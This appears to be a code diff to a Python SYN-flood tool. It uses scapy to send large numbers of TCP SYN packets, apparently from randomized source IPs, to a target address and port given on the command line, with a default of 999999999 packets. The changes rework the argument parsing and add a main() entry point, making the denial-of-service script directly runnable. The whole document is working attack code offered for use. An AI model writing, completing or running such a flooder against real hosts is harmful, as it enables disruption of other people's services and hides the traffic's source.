@@ -1,6 +1,4 @@
 import random
-import socket
-import threading
 from scapy.all import send, IP, TCP
 import argparse
 
@@ -15,18 +13,14 @@ def random_IP():
 
 def get_args():
     parser = argparse.ArgumentParser(description="SYN Flooder\n")
-    parser.add_argument("-t", "--target", help="Target IP Address")
+    parser.add_argument("t", help="Target IP Address")
     parser.add_argument(
-        "-p", "--port", help="Target Port Number (Default:80)", default=80
+        "-p", type=int, help="Target Port Number (Default:80)", default=80
     )
-    parser.add_argument(
-        "-n",
-        "--number",
-        help="Number of packets to send (Default:999999999)",
-        default=DEFAULT_PACKET_AMOUNT,
+    parser.add_argument("-a", type=int, help="Number of packets to send (Default:999999999)", default=DEFAULT_PACKET_AMOUNT
     )
     args = parser.parse_args()
-    return args.t, args.p, args.n
+    return args.t, args.p, args.a
 
 
 def SYN_flooder(T_IP, dPort, packets_to_send):
@@ -46,3 +40,10 @@ def SYN_flooder(T_IP, dPort, packets_to_send):
         send(packet, verbose=0)
 
     print("Attack finished")
+    
+def main():
+    T_IP, dPort, packets_to_send = get_args()
+    SYN_flooder(T_IP, dPort, packets_to_send)
+
+if __name__ == "__main__":
+    main()
